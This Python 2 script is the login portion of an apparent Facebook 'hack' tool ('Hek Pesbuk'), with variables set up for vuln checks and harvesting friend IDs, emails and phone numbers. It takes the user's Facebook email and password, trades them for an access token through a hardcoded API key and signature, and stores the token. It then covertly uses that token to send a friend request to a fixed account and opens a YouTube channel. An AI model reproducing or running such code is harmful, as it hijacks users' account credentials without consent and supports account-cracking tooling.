#!/usr/bin/python
# -*- coding: utf-8 -*-
# Life Of Programmer
# Modified By The Sixty Nine

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError
from mechanize import Browser

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
    print ''
    print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mExit'
    print ''
    print ''
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

logo = """
\x1b[106;96m[]\x1b[100;90m[]\x1b[0m~\x1b[4m\x1b[101;1m H e k \x1b[104;1mP e s b u k \033[0m~\x1b[103;93m[]\x1b[102;92m[]\x1b[105;95m[]\x1b[107;97m[]\x1b[0m
\x1b[1;77m      * Coded by Nedi\x1b[0m
"""

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mLoading \x1b[0m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
id = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[0mNot Vuln'
vuln = '\x1b[0mVuln'

def login():
    os.system('clear')
    os.system('reset')
    time.sleep(1)
    print ''
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        os.system('reset')
        print ''
        print logo
        print ''
        print '\x1b[0m[\x1b[91;1m/\x1b[0m] \x1b[0mPlease Login Account Pesbuk \x1b[0m[\x1b[91;1m/\x1b[0m]'
        id = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mEmail \x1b[0m:\x1b[77;1m ')
        pwd = getpass.getpass('\x1b[0m[\x1b[93;1m+\x1b[0m] \x1b[0mPassword \x1b[0m:\x1b[0m ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[0m[\x1b[96;1m!\x1b[0m] \x1b[77;1mNo connection network'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] \x1b[0mLogin success'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                os.system('xdg-open https://www.youtube.com/channel/UCpVqkAi_sqVf-ZPwzRjME0Q')
                time.sleep(1)
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mNo connection network'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAccount Has Baned Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mOpen not found'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
